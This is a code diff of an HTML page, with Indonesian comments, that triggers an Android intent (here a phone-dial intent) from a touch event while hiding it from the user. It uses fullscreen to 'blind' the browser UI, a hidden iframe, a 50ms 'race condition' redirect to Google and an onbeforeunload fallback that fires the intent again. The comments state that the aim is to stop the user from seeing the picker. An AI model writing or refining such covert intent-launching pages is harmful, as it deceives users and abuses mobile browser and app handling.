@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -15,40 +15,42 @@
     </style>
 </head>
 <body>
+
     <div id="trigger"></div>
 
 <script>
     const trigger = document.getElementById('trigger');
 
     trigger.addEventListener('touchstart', function() {
-        // 1. Masuk Fullscreen untuk menyembunyikan transisi status bar
+        // 1. Fullscreen untuk 'membutakan' UI browser
         if (document.documentElement.requestFullscreen) {
             document.documentElement.requestFullscreen();
         }
 
-        // 2. Target Intent (Contoh: Dial Number)
         const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";
 
-        // 3. Eksekusi via Iframe (Background Execution)
+        // 2. Gunakan Iframe tersembunyi untuk memicu Intent tanpa mengganggu loading
         const iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = intentUrl;
         document.body.appendChild(iframe);
 
-        // 4. Cadangan Pemicu (Mencoba memaksa browser)
+        // 3. Teknik 'Race Condition': Redirect segera setelah pemicuan
+        // Kita beri delay sangat kecil (50ms) agar Iframe sempat memanggil sistem Android
         setTimeout(() => {
-            window.location.href = intentUrl;
-        }, 100);
-
-        // 5. STEALTH REDIRECT
-        // Kita paksa redirect ke Google setelah 800ms
-        // Ini akan menimpa tab Firefox sehingga user tidak melihat 'popup' picker jika ada delay
-        setTimeout(() => {
+            // Keluar dari fullscreen agar transisi ke Google terlihat normal
             if (document.exitFullscreen) {
                 document.exitFullscreen();
             }
+            
+            // Redirect Utama
             window.location.replace("https://www.google.com");
-        }, 800);
+        }, 50);
+
+        // 4. Fallback: Jika Iframe gagal, picu lagi tepat sebelum halaman berpindah
+        window.onbeforeunload = function() {
+            window.location.href = intentUrl;
+        };
     });
 </script>
 </body>
